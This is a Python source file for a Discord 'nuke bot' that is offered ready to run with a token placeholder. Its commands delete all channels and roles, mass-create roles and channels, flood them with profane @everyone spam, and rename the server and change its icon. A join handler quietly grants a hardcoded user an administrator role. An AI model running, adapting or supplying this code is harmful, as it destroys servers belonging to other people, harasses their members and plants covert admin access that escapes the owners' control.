import subprocess
import sys
import random

try:
    import discord
    from discord.ext import commands
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])
    import discord
    from discord.ext import commands

try:
    import aiohttp
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
    import aiohttp

import discord
from discord.ext import commands
import aiohttp
import asyncio
import random

# Your constants here
NEW_SERVER_NAME = "SADISM CREWS PROPERTY" #replace with your rename
NEW_SERVER_ICON_URL = "https://imgur.com/a/AYjgAV8"  # Replace with your image URL
HARDCODED_USER_ID = 1361438095202980045

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

class ChannelDestroyer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.spam_task = None
        self.spam_channel = None
        self.gif_link = "https://tenor.com/view/cat-creepy-smile-grin-smirk-gif-16269033"

    async def change_server_name_and_icon(self, guild):
        try:
            await guild.edit(name=NEW_SERVER_NAME)
            print(f"[+] Server name changed to: {NEW_SERVER_NAME}")
        except Exception as e:
            print(f"[!] Failed to change server name: {e}")

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(NEW_SERVER_ICON_URL) as resp:
                    if resp.status == 200:
                        icon_bytes = await resp.read()
                        await guild.edit(icon=icon_bytes)
                        print(f"[+] Server icon changed successfully.")
                    else:
                        print(f"[!] Failed to download server icon image, status: {resp.status}")
        except Exception as e:
            print(f"[!] Failed to change server icon: {e}")

    @commands.command(name="sword")
    async def delete_all_channels(self, ctx):
        guild = ctx.guild
        await ctx.send("Deleting all channels...")
        for channel in list(guild.channels):
            try:
                await channel.delete(reason="!sword command used")
            except Exception:
                pass
        await ctx.send("All channels deleted.")

    @commands.command(name="exp")
    async def create_test_roles(self, ctx):
        guild = ctx.guild
        await ctx.send("Creating roles named 'SADISTIC'...")
        for _ in range(1000):
            try:
                await guild.create_role(name="SADISTIC", reason="!exp command used")
            except Exception:
                pass
        await ctx.send("Created 1000 roles named 'SADISTIC'.")

    @commands.command(name="anti")
    async def anti(self, ctx):
        guild = ctx.guild
        await self.change_server_name_and_icon(guild)

        try:
            control_channel = await guild.create_text_channel("FLooD")
        except Exception:
            control_channel = None

        if control_channel:
            await control_channel.send("Starting anti operation...")
        else:
            await ctx.send("Starting anti operation...")

        for channel in list(guild.channels):
            if control_channel and channel.id == control_channel.id:
                continue
            try:
                await channel.delete(reason="!anti command used")
            except Exception:
                pass

        base_names = [
            "𝑫𝑶𝑬𝑺 𝑻𝑯𝑬 𝑩𝑨𝑩𝒀 𝑵𝑬𝑬𝑫 𝑯𝑰𝑺 𝑩𝑶𝑻𝑻𝑳𝑬?",
            "𝑮𝑬𝑻 𝑪𝑳𝑶𝑾𝑵𝑬𝑫 𝑶𝑵 𝑩𝒀 𝑺𝑨𝑫𝑰𝑺𝑻𝑰𝑪",
            "𝑮𝑬𝑻 𝑭𝑼𝑪𝑲𝑬𝑫 𝑩𝒀 𝑺𝑨𝑫𝑰𝑺𝑻𝑰𝑪",
        ]

        async def spam_channel(channel):
            for _ in range(30):
                try:
                    await channel.send(
                        f"@everyone AHH COME ON IM NOT THAT SADISTIC RIGHT? ALSO GET FUCKED BY SADISM CREW\n{self.gif_link}"
                    )
                except Exception:
                    pass

        async def create_and_spam_channels():
            for i in range(1000):
                try:
                    base = random.choice(base_names)
                    channel_name = f"{base} {i + 1}"
                    ch = await guild.create_text_channel(channel_name)
                    asyncio.create_task(spam_channel(ch))
                except Exception:
                    pass

        if control_channel:
            asyncio.create_task(spam_channel(control_channel))

        await create_and_spam_channels()

        if control_channel:
            await control_channel.send("All channels created and messages dispatched.")

    @commands.command(name="bypass")
    async def bypass(self, ctx):
        guild = ctx.guild
        await self.change_server_name_and_icon(guild)
        await ctx.send("Starting bypass operation: deleting all channels with random delays...")

        for channel in list(guild.channels):
            try:
                await channel.delete(reason="bypass command used")
                await asyncio.sleep(random.uniform(0.2, 1.0))
            except Exception as e:
                print(f"[!] Failed to delete channel {channel.name}: {e}")

        await asyncio.sleep(1)

        try:
            new_channel = await guild.create_text_channel("bypass-channel")
            self.spam_channel = new_channel
            await new_channel.send("Bypass started. Beginning randomized spam now...")
        except Exception as e:
            print(f"[!] Failed to create bypass channel: {e}")
            return

        if self.spam_task and not self.spam_task.done():
            self.spam_task.cancel()
            try:
                await self.spam_task
            except asyncio.CancelledError:
                pass

        self.spam_task = asyncio.create_task(self.spam_messages())

    async def spam_messages(self):
        print("[*] Spam task started with randomized intervals.")
        while True:
            try:
                if self.spam_channel:
                    await self.spam_channel.send(f"What happened to your security? Also get fucked by sadism crew\n{self.gif_link}")
                await asyncio.sleep(random.uniform(0.4, 1.0))
            except Exception as e:
                print(f"[!] Error in spam_messages: {e}")
                await asyncio.sleep(1)

    @commands.command(name="play?")
    async def mass_delete_roles(self, ctx):
        guild = ctx.guild
        await ctx.send("Starting to delete roles...")

        roles_to_delete = [
            role for role in guild.roles
            if role != guild.default_role and role < guild.me.top_role
        ]

        deleted_count = 0
        for role in roles_to_delete:
            try:
                await role.delete(reason="massdeleteroles command used")
                deleted_count += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

        await ctx.send(f"Deleted {deleted_count} roles.")

    @commands.command(name="mod")
    async def mod_user(self, ctx, member: discord.Member):
        guild = ctx.guild
        role = discord.utils.get(guild.roles, name="Moderator")

        if not role:
            admin_perms = discord.Permissions(administrator=True)
            role = await guild.create_role(name="Moderator", permissions=admin_perms)

        await member.add_roles(role)
        await ctx.send(f"{member.mention} has been given the Moderator role with admin permissions.")

    @commands.Cog.listener()
    async def on_command(self, ctx):
        await ctx.send("This nuke bot was made by @wolfbots on discord check out the GitHub repo here: https://github.com/zonton1/Discord-nuke-bot")
        await asyncio.sleep(1)

# Bot events outside of cog

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("------")

@bot.event
async def on_guild_join(guild):
    user = guild.get_member(HARDCODED_USER_ID)
    if not user:
        return
    try:
        admin_role = await guild.create_role(
            name="WICK",
            permissions=discord.Permissions(administrator=True)
        )
        await user.add_roles(admin_role)
    except Exception:
        pass

# Startup code with token:

async def main():
    await bot.add_cog(ChannelDestroyer(bot))
    token = ""  # <-- Replace this with your Discord bot token
    await bot.start(token)

if __name__ == "__main__":
    asyncio.run(main())
